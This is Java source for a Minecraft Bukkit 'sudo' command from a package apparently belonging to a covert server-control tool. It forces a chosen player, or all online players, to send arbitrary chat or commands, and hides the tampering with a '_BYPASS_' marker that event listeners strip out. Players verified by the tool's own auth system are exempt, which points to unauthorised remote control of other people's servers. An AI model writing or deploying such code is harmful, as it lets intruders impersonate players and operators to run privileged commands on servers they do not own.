package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.apache.commons.lang.ArrayUtils;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

import java.io.IOException;

public class Sudo implements Command, Listener {
    @Override
    public String[] getCommands() {
        return new String[]{"sudo"};
    }

    @Override
    public String getDescription() {
        return "Sudo a player to run a command or do something. I don't care.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length < 2) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "sudo <player/*> <message...>");
            return;
        }

        String[] newArgs = (String[]) ArrayUtils.remove(args, 0);
        String message = String.join(" ", newArgs) + " _BYPASS_";

        if (!args[0].equals("*")) {
            Player foundPlayer = Bukkit.getPlayer(args[0]);
            if (foundPlayer == null) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + "That player was not found!");
                return;
            }

            Bukkit.getScheduler().scheduleSyncDelayedTask(context.getZ_(), () -> {
                try {
                    if(context.getZ_().getAuth().isVerified(foundPlayer.getName())) {
                        sender.sendMessage(Colors.Prefix + Colors.Failure + "That player is authed!");
                        return;
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }

                foundPlayer.chat(message);
                sender.sendMessage(Colors.Prefix + Colors.Success + "Successfully forced " + foundPlayer.getName() + " to run '" + message.replaceAll("_BYPASS_", "").trim() + "'!");
            });
            return;
        }


        Bukkit.getScheduler().scheduleSyncDelayedTask(context.getZ_(), () -> {
            for (Player p : Bukkit.getOnlinePlayers()) {
                p.chat(message);
            }
            sender.sendMessage(Colors.Prefix + Colors.Success + "Successfully forced all to run '" + message.replaceAll("_BYPASS_", "").trim() + "'!");
        });
    }

    @Override
    public void onEnable(Z_ z) {
        z.getServer().getPluginManager().registerEvents(this, z);
    }

    @EventHandler(priority = EventPriority.MONITOR)
    private void onChat(AsyncPlayerChatEvent e) {
        if (e.getMessage().contains("_BYPASS_")) {
            e.setMessage(e.getMessage().replaceAll("_BYPASS_", ""));
        }
    }

    @EventHandler(priority = EventPriority.MONITOR)
    private void onCommand(PlayerCommandPreprocessEvent e) {
        if (e.getMessage().contains("_BYPASS_")) {
            e.setMessage(e.getMessage().replaceAll("_BYPASS_", ""));
        }
    }
}
